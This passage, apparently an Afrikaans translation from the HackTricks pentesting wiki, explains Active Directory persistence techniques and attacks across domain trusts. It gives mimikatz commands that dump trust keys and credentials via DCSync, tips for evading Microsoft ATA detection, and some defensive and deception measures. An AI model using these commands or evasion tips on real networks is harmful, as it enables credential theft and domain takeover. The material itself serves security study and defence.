Die **AdminSDHolder**-voorwerp in Active Directory verseker die veiligheid van **bevoorregte groepe** (soos Domeinadministrateurs en Ondernemingsadministrateurs) deur 'n standaard **Toegangsbeheerlys (ACL)** oor hierdie groepe toe te pas om ongemagtigde veranderinge te voorkom. Hierdie kenmerk kan egter uitgebuit word; as 'n aanvaller die ACL van AdminSDHolder wysig om volle toegang aan 'n gewone gebruiker te gee, verkry daardie gebruiker uitgebreide beheer oor alle bevoorregte groepe. Hierdie veiligheidsmaatreël, bedoel om te beskerm, kan dus terugslaan en ongemagtigde toegang toelaat tensy dit noukeurig gemonitor word.

[**Meer inligting oor AdminDSHolder Groep hier.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Geloofsbriewe

Binne elke **Domeinbeheerder (DC)** bestaan 'n **plaaslike administrateur**-rekening. Deur adminregte op so 'n masjien te verkry, kan die plaaslike Administrateur-hash onttrek word deur **mimikatz** te gebruik. Hierna is 'n registerwyziging nodig om die gebruik van hierdie wagwoord te aktiveer, wat afstandstoegang tot die plaaslike Administrateur-rekening moontlik maak.

{% content-ref url="dsrm-credentials.md" %}
[dsrm-credentials.md](dsrm-credentials.md)
{% endcontent-ref %}

### ACL Volharding

Jy kan **sekere toestemmings** aan 'n **gebruiker** gee oor sekere spesifieke domeinvoorwerpe wat die gebruiker in die toekoms kan help om voorregte te eskaleer.

{% content-ref url="acl-persistence-abuse/" %}
[acl-persistence-abuse](acl-persistence-abuse/)
{% endcontent-ref %}

### Sekuriteitsbeskrywers

Die **sekuriteitsbeskrywers** word gebruik om die **toestemmings** wat 'n **voorwerp** oor 'n **voorwerp** het, te **stoor**. As jy net 'n **klein verandering** in die **sekuriteitsbeskrywer** van 'n voorwerp kan maak, kan jy baie interessante voorregte oor daardie voorwerp verkry sonder om 'n lid van 'n bevoorregte groep te wees.

{% content-ref url="security-descriptors.md" %}
[security-descriptors.md](security-descriptors.md)
{% endcontent-ref %}

### Skeletsleutel

Verander **LSASS** in geheue om 'n **universele wagwoord** te vestig wat toegang tot alle domeinrekeninge verleen.

{% content-ref url="skeleton-key.md" %}
[skeleton-key.md](skeleton-key.md)
{% endcontent-ref %}

### Aangepaste SSP

[Leer wat 'n SSP (Sekuriteitsondersteuningsverskaffer) hier is.](../authentication-credentials-uac-and-efs/#security-support-provider-interface-sspi)\
Jy kan jou **eie SSP** skep om in **klarteks** die **geloofsbriewe** wat gebruik word om toegang tot die masjien te verkry, **vas te vang**.

{% content-ref url="custom-ssp.md" %}
[custom-ssp.md](custom-ssp.md)
{% endcontent-ref %}

### DCShadow

Dit registreer 'n **nuwe Domeinbeheerder** in die AD en gebruik dit om eienskappe (SIDHistory, SPNs...) op spesifieke voorwerpe te **druk sonder** om enige **logboeke** oor die **veranderings** agter te laat. Jy **benodig DA-voorregte** en moet binne die **hoofdomein** wees.\
Let daarop dat as jy verkeerde data gebruik, baie lelike logboeke sal verskyn.

{% content-ref url="dcshadow.md" %}
[dcshadow.md](dcshadow.md)
{% endcontent-ref %}

### LAPS Volharding

Vroeër het ons bespreek hoe om voorregte te eskaleer as jy **genoeg toestemming het om LAPS-wagwoorde te lees**. Hierdie wagwoorde kan egter ook gebruik word om **volharding te handhaaf**.\
Kyk:

{% content-ref url="laps.md" %}
[laps.md](laps.md)
{% endcontent-ref %}

## Bos Voorregte Eskalasie - Domeinvertroue

Microsoft beskou die **Bos** as die sekuriteitsgrens. Dit impliseer dat **die kompromittering van 'n enkele domein moontlik kan lei tot die hele Bos wat gekompromitteer word**.

### Basiese Inligting

'n [**Domeinvertroue**](http://technet.microsoft.com/en-us/library/cc759554\(v=ws.10\).aspx) is 'n sekuriteitsmeganisme wat 'n gebruiker van die een **domein** in staat stel om hulpbronne in 'n ander **domein** te benader. Dit skep essensieel 'n skakeling tussen die outentiseringsstelsels van die twee domeine, wat outentiseringsverifikasies vlot laat vloei. Wanneer domeine 'n vertroue opstel, ruil en behou hulle spesifieke **sleutels** binne hul **Domeinbeheerders (DC's)**, wat krities is vir die integriteit van die vertroue.

In 'n tipiese scenario, as 'n gebruiker beoog om 'n diens in 'n **vertroue domein** te benader, moet hulle eers 'n spesiale kaartjie bekend as 'n **inter-realm TGT** van hul eie domein se DC aanvra. Hierdie TGT is versleutel met 'n gedeelde **sleutel** waaroor beide domeine saamgestem het. Die gebruiker bied dan hierdie TGT aan die **DC van die vertroue domein** aan om 'n dienskaartjie (**TGS**) te kry. Na suksesvolle validering van die inter-realm TGT deur die DC van die vertroue domein, reik dit 'n TGS uit, wat die gebruiker toegang tot die diens verleen.

**Stappe**:

1. 'n **Kliëntrekenaar** in **Domein 1** begin die proses deur sy **NTLM-hash** te gebruik om 'n **Kaartjie-verleningkaartjie (TGT)** van sy **Domeinbeheerder (DC1)** aan te vra.
2. DC1 reik 'n nuwe TGT uit as die kliënt suksesvol geoutentiseer is.
3. Die kliënt vra dan 'n **inter-realm TGT** van DC1 aan, wat nodig is om hulpbronne in **Domein 2** te benader.
4. Die inter-realm TGT is versleutel met 'n **vertroue sleutel** wat gedeel word tussen DC1 en DC2 as deel van die tweerigting domeinvertroue.
5. Die kliënt neem die inter-realm TGT na **Domein 2 se Domeinbeheerder (DC2)**.
6. DC2 verifieer die inter-realm TGT met sy gedeelde vertroue sleutel en, indien geldig, reik 'n **Dienskaartjie-verleningsdiens (TGS)** uit vir die bediener in Domein 2 wat die kliënt wil benader.
7. Laastens bied die kliënt hierdie TGS aan die bediener aan, wat met die rekeninghash van die bediener versleutel is, om toegang tot die diens in Domein 2 te verkry.

### Verskillende vertroues

Dit is belangrik om te let dat **'n vertroue eenrigting of tweerigting kan wees**. In die tweerigting opsies sal beide domeine mekaar vertrou, maar in die **eenrigting** vertrouensverhouding sal een van die domeine die **vertrouende** en die ander die **vertrouende** domein wees. In laasgenoemde geval **sal jy slegs in staat wees om hulpbronne binne die vertrouende domein van die vertrouende een te benader**.

As Domein A vertroue in Domein B het, is A die vertrouende domein en B die vertroude een. Verder, in **Domein A**, sal dit 'n **Uitgaande vertroue** wees; en in **Domein B**, sal dit 'n **Inkomende vertroue** wees.

**Verskillende vertrouende verhoudings**

* **Ouer-Kind Vertroues**: Dit is 'n algemene opstelling binne dieselfde bos, waar 'n kinderdomein outomaties 'n tweerigting transitatiewe vertroue met sy ouerdomein het. Dit beteken essensieel dat outentiseringsversoeke vlot tussen die ouer en die kind kan vloei.
* **Kruisverwysingsvertroues**: Bekend as "afkappingsvertroues," word hierdie tussen kinderdomeine opgestel om verwysingsprosesse te bespoedig. In komplekse bosse moet outentiseringsverwysings tipies na die boswortel opklim en dan na die teikendomein afdaal. Deur kruisverwysings te skep, word die reis verkort, wat veral voordelig is in geografies verspreide omgewings.
* **Eksterne Vertroues**: Hierdie word opgestel tussen verskillende, onverwante domeine en is nie-transitatief van aard nie. Volgens [Microsoft se dokumentasie](https://technet.microsoft.com/en-us/library/cc773178\(v=ws.10\).aspx) is eksterne vertroues nuttig vir die benadering van hulpbronne in 'n domein buite die huidige bos wat nie deur 'n bosvertroue gekoppel is nie. Sekuriteit word versterk deur SID-filtering met eksterne vertroues.
* **Boomwortelvertroues**: Hierdie vertroues word outomaties opgestel tussen die bosworteldomein en 'n nuut bygevoegde boomwortel. Alhoewel dit nie algemeen voorkom nie, is boomwortelvertroues belangrik vir die byvoeging van nuwe domynbome aan 'n bos, wat hulle in staat stel om 'n unieke domeinnaam te behou en twee-rigting transitiwiteit te verseker. Meer inligting kan gevind word in [Microsoft se gids](https://technet.microsoft.com/en-us/library/cc773178\(v=ws.10\).aspx).
* **Bosvertroues**: Hierdie tipe vertroue is 'n tweerigting transitatiewe vertroue tussen twee bosworteldomeine, wat ook SID-filtering afdwing om sekuriteitsmaatreëls te versterk.
* **MIT Vertroues**: Hierdie vertroues word opgestel met nie-Windows, [RFC4120-kompatible](https://tools.ietf.org/html/rfc4120) Kerberos-domeine. MIT-vertroues is 'n bietjie meer gespesialiseerd en bedien om omgewings te akkommodeer wat integrasie met Kerberos-gebaseerde stelsels buite die Windows-ekosisteem vereis.
#### Ander verskille in **vertrouensverhoudings**

* 'n Vertrouensverhouding kan ook **transitief** wees (A vertrou B, B vertrou C, dan vertrou A C) of **nie-transitief**.
* 'n Vertrouensverhouding kan opgestel word as 'n **tweerigting vertroue** (beide vertrou mekaar) of as 'n **eenrigting vertroue** (net een van hulle vertrou die ander).

### Aanvalspad

1. **Enumerate** die vertrouensverhoudings
2. Kyk of enige **sekuriteitsprinsipaal** (gebruiker/groep/rekenaar) toegang het tot die hulpbronne van die **ander domein**, miskien deur ACE-inskrywings of deur in groepe van die ander domein te wees. Soek na **verhoudings oor domeine** (die vertroue is waarskynlik hiervoor geskep).
1. Kerberoast kan in hierdie geval 'n ander opsie wees.
3. **Kompromitteer** die **rekeninge** wat deur domeine kan **pivot**.

Aanvallers met toegang tot hulpbronne in 'n ander domein deur drie primêre meganismes:

* **Plaaslike Groepslidmaatskap**: Prinsipale kan bygevoeg word by plaaslike groepe op rekenaars, soos die "Administrateurs" groep op 'n bediener, wat hulle aansienlike beheer oor daardie rekenaar gee.
* **Vreemde Domein Groepslidmaatskap**: Prinsipale kan ook lede wees van groepe binne die vreemde domein. Die doeltreffendheid van hierdie metode hang egter af van die aard van die vertroue en die omvang van die groep.
* **Toegangsbeheerlyste (ACL's)**: Prinsipale kan gespesifiseer word in 'n **ACL**, veral as entiteite in **ACE's** binne 'n **DACL**, wat hulle toegang tot spesifieke hulpbronne bied. Vir diegene wat die meganika van ACL's, DACL's en ACE's dieper wil verken, is die witblad getiteld "[An ACE Up The Sleeve](https://specterops.io/assets/resources/an\_ace\_up\_the\_sleeve.pdf)" 'n waardevolle bron.

### Kind-tot-ouer bos voorreg eskalasie
```
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
{% hint style="warning" %}
Daar is **2 vertroue sleutels**, een vir _Kind --> Ouers_ en 'n ander een vir _Ouers_ --> _Kind_.\
Jy kan die een wat deur die huidige domein gebruik word met:
```bash
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
```
{% endhint %}

#### SID-History Injection

Eskaleer as Ondernemingsadministrateur na die kind/ouer domein deur die vertroue te misbruik met SID-History inspuiting:

{% content-ref url="sid-history-injection.md" %}
[sid-history-injection.md](sid-history-injection.md)
{% endcontent-ref %}

#### Uitbuiting van skryfbare Konfigurasie NC

Begrip van hoe die Konfigurasie Naamkonteks (NC) uitgebuit kan word, is noodsaaklik. Die Konfigurasie NC dien as 'n sentrale argief vir konfigurasiedata regoor 'n woud in Aktiewe Gids (AD) omgewings. Hierdie data word gerepliseer na elke Domeinbeheerder (DC) binne die woud, met skryfbare DC's wat 'n skryfbare kopie van die Konfigurasie NC handhaaf. Om hiervan te profiteer, moet 'n persoon **STELSEL-voorregte op 'n DC** hê, verkieslik 'n kind DC.

**Skakel GPO aan die wortel DC-plek**

Die Sites-houer van die Konfigurasie NC bevat inligting oor al die rekenaars wat by domeine binne die AD-woud aangesluit is. Deur met STELSEL-voorregte op enige DC te werk, kan aanvallers GPO's aan die wortel DC-plekke koppel. Hierdie aksie kan potensieel die worteldomein in gevaar bring deur beleide wat op hierdie plekke toegepas word, te manipuleer.

Vir in-diepte inligting kan 'n persoon navorsing oor [SID-filterontduiking](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research) verken.

**Kompromitteer enige gMSA in die woud**

'n Aanvalvektor behels die teiken van bevoorregte gMSAs binne die domein. Die KDS-wortelsleutel, noodsaaklik vir die berekening van gMSA-wagwoorde, word binne die Konfigurasie NC gestoor. Met STELSEL-voorregte op enige DC is dit moontlik om toegang tot die KDS-wortelsleutel te verkry en die wagwoorde vir enige gMSA regoor die woud te bereken.

Gedetailleerde analise kan gevind word in die bespreking oor [Golden gMSA Trust Aanvalle](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent).

**Skemasveranderingsaanval**

Hierdie metode vereis geduld, terwyl gewag word vir die skepping van nuwe bevoorregte AD-voorwerpe. Met STELSEL-voorregte kan 'n aanvaller die AD-skema wysig om enige gebruiker volledige beheer oor alle klasse te verleen. Dit kan lei tot ongemagtigde toegang en beheer oor nuut geskepte AD-voorwerpe.

Verdere leesstof is beskikbaar oor [Skemasveranderingsaanvalle](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-6-schema-change-trust-attack-from-child-to-parent).

**Van DA tot EA met ADCS ESC5**

Die ADCS ESC5 kwesbaarheid teiken beheer oor Openbare Sleutel Infrastruktuur (PKI) voorwerpe om 'n sertifikaatsjabloon te skep wat verifikasie as enige gebruiker binne die woud moontlik maak. Aangesien PKI-voorwerpe in die Konfigurasie NC bly, maak die kompromittering van 'n skryfbare kind DC die uitvoering van ESC5-aanvalle moontlik.

Meer besonderhede hieroor kan gelees word in [Van DA tot EA met ESC5](https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c). In scenario's waar ADCS ontbreek, het die aanvaller die vermoë om die nodige komponente op te stel, soos bespreek in [Eskalering van Kinddomeinadministrateurs tot Ondernemingsadministrateurs](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/).

### Eksterne Woudsdomein - Eenrigting (Inkomend) of tweerigting
```powershell
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
In hierdie scenario **word jou domein vertrou** deur 'n eksterne een wat jou **onbepaalde regte** daaroor gee. Jy sal moet vind **watter hoofde van jou domein watter toegang oor die eksterne domein het** en dan probeer om dit te benut:

{% content-ref url="external-forest-domain-oneway-inbound.md" %}
[external-forest-domain-oneway-inbound.md](external-forest-domain-oneway-inbound.md)
{% endcontent-ref %}

### Eksterne Bos Domein - Eenrigting (Uitgaande)
```powershell
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
In hierdie scenario **vertrou** jou domein sommige **voorregte** toe aan 'n beginsel van 'n **verskillende domein**.

Tog, wanneer 'n **domein vertrou** word deur die vertrouende domein, skep die vertroude domein 'n gebruiker met 'n **voorspelbare naam** wat die vertroude wagwoord gebruik. Dit beteken dat dit moontlik is om 'n gebruiker van die vertrouende domein te **benader om binne te kom in die vertroude een** om dit te ondersoek en te probeer om meer voorregte te verkry:

{% content-ref url="external-forest-domain-one-way-outbound.md" %}
[external-forest-domain-one-way-outbound.md](external-forest-domain-one-way-outbound.md)
{% endcontent-ref %}

'n Ander manier om die vertroude domein te kompromitteer is om 'n [**SQL vertroude skakel**](abusing-ad-mssql.md#mssql-trusted-links) te vind wat in die **teenoorgestelde rigting** van die domeinvertroue geskep is (wat nie baie algemeen is nie).

'n Ander manier om die vertroude domein te kompromitteer is om te wag in 'n masjien waar 'n **gebruiker van die vertroude domein kan toegang kry** om in te teken via **RDP**. Dan kan die aanvaller kode inspuit in die RDP-sessieproses en **die oorsprongsdomein van die slagoffer benader** van daar af.\
Verder, as die **slagoffer sy hardeskyf aangeheg het**, kan die aanvaller vanuit die RDP-sessieproses **agterdeure** in die **aanvangsvouer van die hardeskyf** stoor. Hierdie tegniek word **RDPInception** genoem.

{% content-ref url="rdp-sessions-abuse.md" %}
[rdp-sessions-abuse.md](rdp-sessions-abuse.md)
{% endcontent-ref %}

### Misbruik van domeinvertroue-mitigasie

### **SID-filtering:**

* Die risiko van aanvalle wat die SID-geskiedenis attribuut oor bosvertrouens benut, word gemitigeer deur SID-filtering, wat standaard geaktiveer is op alle inter-bosvertrouens. Dit word ondersteun deur die aanname dat intra-bosvertrouens veilig is, met die bos eerder as die domein as die sekuriteitsgrens volgens Microsoft se standpunt.
* Daar is egter 'n vang: SID-filtering kan programme en gebruikerstoegang ontwrig, wat tot sy af en toe deaktivering kan lei.

### **Selektiewe verifikasie:**

* Vir inter-bosvertrouens verseker Selektiewe Verifikasie dat gebruikers van die twee bome nie outomaties geoutentiseer word nie. In plaas daarvan word eksplisiete toestemmings vereis vir gebruikers om domeine en bedieners binne die vertrouende domein of bos te benader.
* Dit is belangrik om daarop te let dat hierdie maatreëls nie beskerm teen die uitbuiting van die skryfbare Konfigurasie Naamkonteks (NC) of aanvalle op die vertroue-rekening nie.

[**Meer inligting oor domeinvertrouens in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)

## AD -> Azure & Azure -> AD

{% embed url="https://cloud.hacktricks.xyz/pentesting-cloud/azure-security/az-lateral-movements/azure-ad-connect-hybrid-identity" %}

## Sekerheidsmaatreëls

[**Leer meer oor hoe om geloofsbriewe te beskerm hier.**](../stealing-credentials/credentials-protections.md)\\

### **Verdedigende Maatreëls vir Geloofsbriewe-beskerming**

* **Domeinadministrateursbeperkings**: Dit word aanbeveel dat domeinadministrateurs slegs toegelaat word om by domeinbeheerders in te teken, om hul gebruik op ander gasheers te vermy.
* **Diensrekeningvoorregte**: Dienste moet nie met Domeinadministrateur (DA) voorregte uitgevoer word om sekuriteit te handhaaf nie.
* **Tydelike Voorregbeperking**: Vir take wat DA-voorregte vereis, moet hul duur beperk word. Dit kan bereik word deur: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`

### **Implementering van Bedrogtegnieke**

* Die implementering van bedrog behels die opstel van lokvalle, soos vals gebruikers of rekenaars, met kenmerke soos wagwoorde wat nie verval nie of as Vertrou vir Delegering gemerk is. 'n Gedetailleerde benadering sluit in die skep van gebruikers met spesifieke regte of om hulle by hoë voorreggroepe te voeg.
* 'n Praktiese voorbeeld behels die gebruik van gereedskap soos: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
* Meer oor die implementering van bedrogtegnieke kan gevind word by [Deploy-Deception op GitHub](https://github.com/samratashok/Deploy-Deception).

### **Identifisering van Bedrog**

* **Vir Gebruiker-voorwerpe**: Verdagte aanwysers sluit ongewone ObjectSID, selde intekening, skeppingsdatums en lae slegte wagwoordtellings in.
* **Algemene Aanwysers**: Vergelyking van eienskappe van potensiële lokvalvoorwerpe met dié van ware eenhede kan inkonsekwensies aan die lig bring. Gereedskap soos [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) kan help om sulke bedrogte identifiseer.

### **Omseiling van Deteksiesisteme**

* **Microsoft ATA Deteksie Omseiling**:
* **Gebruikeropnoeming**: Vermy sessieopnoeming op Domeinbeheerders om ATA-deteksie te voorkom.
* **Kaartjie-impersonasie**: Die gebruik van **aes** sleutels vir kaartjie-skepping help om deteksie te ontduik deur nie af te gradeer na NTLM nie.
* **DCSync-aanvalle**: Uitvoering vanaf 'n nie-Domeinbeheerder om ATA-deteksie te vermy word aanbeveel, aangesien direkte uitvoering vanaf 'n Domeinbeheerder waarskuwings sal veroorsaak.

## Verwysings

* [http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)
* [https://www.labofapenetrationtester.com/2018/10/deploy-deception.html](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)

<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat** Kontroleer die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**Die PEASS-familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFT's**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>
